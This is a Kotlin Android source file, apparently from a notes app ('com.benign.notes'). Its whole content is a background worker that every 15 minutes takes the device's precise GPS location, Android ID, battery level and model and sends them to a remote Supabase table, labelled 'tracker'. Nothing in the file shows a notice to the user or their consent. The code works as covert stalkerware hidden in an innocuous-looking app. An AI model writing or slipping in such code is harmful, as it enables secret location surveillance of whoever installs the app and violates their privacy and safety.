package com.benign.notes

import android.annotation.SuppressLint
import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import androidx.work.*
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class BeaconWorker(private val ctx: Context, params: WorkerParameters) : CoroutineWorker(ctx, params) {

    private val supabaseUrl = "https://YOUR-PROJECT-ID.supabase.co"
    private val supabaseKey = "YOUR-LONG-JWT-ANON-KEY"

    @SuppressLint("MissingPermission")
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            val client = LocationServices.getFusedLocationProviderClient(ctx)
            val loc = client.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, CancellationTokenSource().token).await()
            postToSupabase(loc?.latitude, loc?.longitude)
            Result.success()
        } catch (e: Exception) {
            Result.retry()
        }
    }

    private fun postToSupabase(lat: Double?, lon: Double?) {
        val id = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batt = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val json = """{"id": "$id", "ts": ${System.currentTimeMillis()}, "lat": ${lat ?: "null"}, "lon": ${lon ?: "null"}, "batt": $batt, "model": "${Build.MODEL}", "sdk": ${Build.VERSION.SDK_INT}}"""

        val conn = URL("$supabaseUrl/rest/v1/beacons").openConnection() as HttpURLConnection
        try {
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Prefer", "return=minimal")
            conn.doOutput = true
            OutputStreamWriter(conn.outputStream).use { it.write(json) }
            conn.responseCode 
        } finally {
            conn.disconnect()
        }
    }

    companion object {
        fun schedule(ctx: Context) {
            val req = PeriodicWorkRequestBuilder<BeaconWorker>(15, TimeUnit.MINUTES).build()
            WorkManager.getInstance(ctx).enqueueUniquePeriodicWork("tracker", ExistingPeriodicWorkPolicy.UPDATE, req)
        }
    }
}
